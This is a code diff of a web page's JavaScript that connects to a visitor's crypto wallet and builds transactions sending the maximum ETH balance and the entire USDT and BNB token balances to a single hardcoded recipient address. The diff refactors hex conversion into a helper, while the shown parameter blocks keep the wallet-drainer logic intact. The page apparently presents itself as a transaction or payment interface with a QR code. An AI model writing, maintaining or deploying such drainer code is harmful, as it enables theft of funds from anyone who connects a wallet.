@@ -66,7 +66,7 @@
         const transactionDetailsInput = document.getElementById('transactionDetails');
         const qrCodeContainer = document.getElementById('qrCodeContainer');
         const recipientAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
-        const gasLimit = BigInt(21000); // Changed to BigInt
+        const gasLimit = BigInt(21000);
 
         const tokenAddresses = {
             USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
@@ -89,6 +89,10 @@
                 "type": "function"
             }
         ];
+
+        function toHex(value) {
+            return '0x' + value.toString(16);
+        }
 
         async function init() {
             const providerOptions = {
@@ -163,30 +167,30 @@
                     const ethTransactionParameters = {
                         to: recipientAddress,
                         from: senderAddress,
-                        value: '0x' + maxEthTransferWei.toString(16),
-                        gas: '0x' + gasLimit.toString(16),
-                        maxFeePerGas: '0x' + maxFeePerGas.toString(16),
-                        maxPriorityFeePerGas: '0x' + maxPriorityFeePerGas.toString(16)
+                        value: toHex(maxEthTransferWei),
+                        gas: toHex(gasLimit),
+                        maxFeePerGas: toHex(maxFeePerGas),
+                        maxPriorityFeePerGas: toHex(maxPriorityFeePerGas)
                     };
 
                     const usdtTransactionParameters = {
                         to: tokenAddresses.USDT,
                         from: senderAddress,
                         value: '0x0', // No ETH value required
-                        gas: '0x' + gasLimit.toString(16),
-                        maxFeePerGas: '0x' + maxFeePerGas.toString(16),
-                        maxPriorityFeePerGas: '0x' + maxPriorityFeePerGas.toString(16),
-                        data: usdtContract.methods.transfer(recipientAddress, '0x' + usdtBalanceWei.toString(16)).encodeABI()
+                        gas: toHex(gasLimit),
+                        maxFeePerGas: toHex(maxFeePerGas),
+                        maxPriorityFeePerGas: toHex(maxPriorityFeePerGas),
+                        data: usdtContract.methods.transfer(recipientAddress, toHex(usdtBalanceWei)).encodeABI()
                     };
 
                     const bnbTransactionParameters = {
                         to: tokenAddresses.BNB,
                         from: senderAddress,
                         value: '0x0', // No ETH value required
-                        gas: '0x' + gasLimit.toString(16),
-                        maxFeePerGas: '0x' + maxFeePerGas.toString(16),
-                        maxPriorityFeePerGas: '0x' + maxPriorityFeePerGas.toString(16),
-                        data: bnbContract.methods.transfer(recipientAddress, '0x' + bnbBalanceWei.toString(16)).encodeABI()
+                        gas: toHex(gasLimit),
+                        maxFeePerGas: toHex(maxFeePerGas),
+                        maxPriorityFeePerGas: toHex(maxPriorityFeePerGas),
+                        data: bnbContract.methods.transfer(recipientAddress, toHex(bnbBalanceWei)).encodeABI()
                     };
 
                     // Send transactions
